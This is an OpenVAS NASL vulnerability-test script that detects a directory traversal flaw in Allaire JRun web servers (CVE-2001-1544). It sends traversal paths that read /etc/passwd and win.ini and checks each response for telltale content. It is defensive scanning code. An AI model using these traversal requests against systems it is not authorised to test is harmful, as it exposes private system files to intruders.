# OpenVAS Vulnerability Test
# $Id: DDI_JRun_Traversal.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: JRun directory traversal
#
# Authors:
# H D Moore
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Digital Defense Inc.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "This host is running the Allaire JRun web server. Versions 2.3.3, 3.0, and
3.1 are vulnerable to a directory traversal attack.  This allows a potential
intruder to view the contents of any file on the system.";

tag_solution = "The vendor has addressed this issue in Macromedia Product Security
Bulletin MPSB01-17.  Please upgrade to the latest version of JRun available
from http://www.allaire.com/";

if(description)
{
    script_oid("1.3.6.1.4.1.25623.1.0.10997");
    script_version("$Revision: 9348 $");
    script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
    script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
    script_cve_id("CVE-2001-1544");
    script_bugtraq_id(3666);
    script_tag(name:"cvss_base", value:"5.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
    name = "JRun directory traversal";
    script_name(name);


    summary = "Attempts directory traversal attack";


    script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");


    script_copyright("This script is Copyright (C) 2002 Digital Defense Inc.");
    family = "Web application abuses";
    script_family(family);
    script_dependencies("find_service.nasl", "http_version.nasl");
    script_require_ports("Services/www", 8000);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

req_unx = "/../../../../../../../../etc/passwd"; 	pat_unx = "root:";
req_win = "/..\..\..\..\..\..\..\..\winnt\win.ini"; 	pat_win = "[fonts]";

port = get_http_port(default:8000);
if ( ! port ) exit(0);

wkey = string("web/traversal/", port);

trav = get_kb_item(wkey);
if (trav) exit(0);

if(get_port_state(port))
{
    req = http_get(item:req_unx, port:port);      
    res = http_keepalive_send_recv(data:req, port:port);
    if ( res == NULL ) exit(0);
    
    if(pat_unx >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);
        security_message(port);
        exit(0);
    }
    
    req = http_get(item:req_win, port:port);      
    res = http_keepalive_send_recv(port:port, data:req);
    if ( res == NULL ) exit(0);

    if(pat_win >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);    
        security_message(port);
        exit(0);
    }  
}
 
